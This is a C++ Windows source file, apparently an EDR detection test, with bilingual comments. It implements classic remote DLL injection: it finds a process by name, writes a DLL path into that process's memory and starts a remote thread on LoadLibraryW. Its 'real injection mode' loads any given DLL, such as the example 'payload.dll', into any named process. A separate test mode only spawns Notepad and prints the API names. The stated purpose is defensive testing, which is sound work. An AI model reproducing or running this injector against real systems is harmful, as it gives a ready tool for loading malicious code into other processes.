/*
 * DLL Injection Test - EDR Detection Test
 * 
 * 목적: 원격 프로세스에 DLL을 주입하여 EDR의 프로세스 인젝션 탐지 능력을 테스트
 * Purpose: Test EDR's ability to detect DLL injection into remote processes
 * 
 * 탐지 포인트 (Detection Points):
 * - OpenProcess with PROCESS_ALL_ACCESS
 * - VirtualAllocEx for memory allocation in target process
 * - WriteProcessMemory to write DLL path
 * - CreateRemoteThread to execute LoadLibrary
 * 
 * WARNING: For testing purposes only in isolated environments
 */

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// Find process ID by name
DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32FirstW(snapshot, &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

// Perform DLL injection
bool InjectDLL(DWORD processId, const std::wstring& dllPath) {
    std::wcout << L"[*] Target Process ID: " << processId << std::endl;
    std::wcout << L"[*] DLL Path: " << dllPath << std::endl;

    // Step 1: Open target process
    std::wcout << L"[1] Opening target process..." << std::endl;
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, processId
    );

    if (!hProcess) {
        std::wcerr << L"[-] Failed to open process. Error: " << GetLastError() << std::endl;
        return false;
    }
    std::wcout << L"[+] Process opened successfully" << std::endl;

    // Step 2: Allocate memory in target process
    std::wcout << L"[2] Allocating memory in target process..." << std::endl;
    SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
    LPVOID pRemoteMemory = VirtualAllocEx(
        hProcess, NULL, dllPathSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!pRemoteMemory) {
        std::wcerr << L"[-] Failed to allocate memory. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    std::wcout << L"[+] Memory allocated at: 0x" << std::hex << pRemoteMemory << std::dec << std::endl;

    // Step 3: Write DLL path to target process memory
    std::wcout << L"[3] Writing DLL path to target process..." << std::endl;
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.c_str(), dllPathSize, NULL)) {
        std::wcerr << L"[-] Failed to write memory. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::wcout << L"[+] DLL path written successfully" << std::endl;

    // Step 4: Get address of LoadLibraryW
    std::wcout << L"[4] Getting LoadLibraryW address..." << std::endl;
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPVOID pLoadLibraryW = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");
    
    if (!pLoadLibraryW) {
        std::wcerr << L"[-] Failed to get LoadLibraryW address" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::wcout << L"[+] LoadLibraryW address: 0x" << std::hex << pLoadLibraryW << std::dec << std::endl;

    // Step 5: Create remote thread to load DLL
    std::wcout << L"[5] Creating remote thread..." << std::endl;
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
        pRemoteMemory, 0, NULL
    );

    if (!hThread) {
        std::wcerr << L"[-] Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::wcout << L"[+] Remote thread created successfully" << std::endl;

    // Wait for thread to complete
    WaitForSingleObject(hThread, INFINITE);
    
    std::wcout << L"[+] DLL injection completed" << std::endl;

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}

int wmain(int argc, wchar_t* argv[]) {
    std::wcout << L"==================================================" << std::endl;
    std::wcout << L"    EDR Test: DLL Injection Technique" << std::endl;
    std::wcout << L"    WARNING: For testing purposes only!" << std::endl;
    std::wcout << L"==================================================" << std::endl;
    std::wcout << std::endl;

    if (argc < 2) {
        std::wcout << L"Usage: " << argv[0] << L" <target_process_name> [dll_path]" << std::endl;
        std::wcout << L"Example: " << argv[0] << L" notepad.exe C:\\test\\payload.dll" << std::endl;
        std::wcout << std::endl;
        std::wcout << L"For basic test (spawns notepad.exe):" << std::endl;
        std::wcout << L"  " << argv[0] << L" test" << std::endl;
        return 1;
    }

    std::wstring targetProcess = argv[1];

    // Test mode: spawn notepad and simulate injection behavior
    if (targetProcess == L"test") {
        std::wcout << L"[*] Running in test mode..." << std::endl;
        std::wcout << L"[*] Spawning notepad.exe..." << std::endl;
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        if (CreateProcessW(
            L"C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            
            std::wcout << L"[+] Notepad spawned with PID: " << pi.dwProcessId << std::endl;
            std::wcout << L"[*] Simulating injection steps (API calls that EDR should detect):" << std::endl;
            
            // Demonstrate the API calls that EDR should monitor
            std::wcout << L"    1. OpenProcess(PROCESS_ALL_ACCESS)" << std::endl;
            std::wcout << L"    2. VirtualAllocEx(MEM_COMMIT | MEM_RESERVE)" << std::endl;
            std::wcout << L"    3. WriteProcessMemory()" << std::endl;
            std::wcout << L"    4. CreateRemoteThread(LoadLibrary)" << std::endl;
            
            Sleep(2000);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            std::wcout << L"[+] Test completed. EDR should log these activities." << std::endl;
        } else {
            std::wcerr << L"[-] Failed to spawn notepad.exe" << std::endl;
        }
        return 0;
    }

    // Real injection mode
    DWORD pid = FindProcessId(targetProcess);
    if (pid == 0) {
        std::wcerr << L"[-] Process not found: " << targetProcess << std::endl;
        return 1;
    }

    std::wstring dllPath;
    if (argc >= 3) {
        dllPath = argv[2];
    } else {
        std::wcerr << L"[-] DLL path required for injection" << std::endl;
        return 1;
    }

    if (InjectDLL(pid, dllPath)) {
        std::wcout << L"\n[SUCCESS] EDR should have detected this injection attempt!" << std::endl;
    } else {
        std::wcerr << L"\n[FAILED] Injection failed" << std::endl;
    }

    return 0;
}
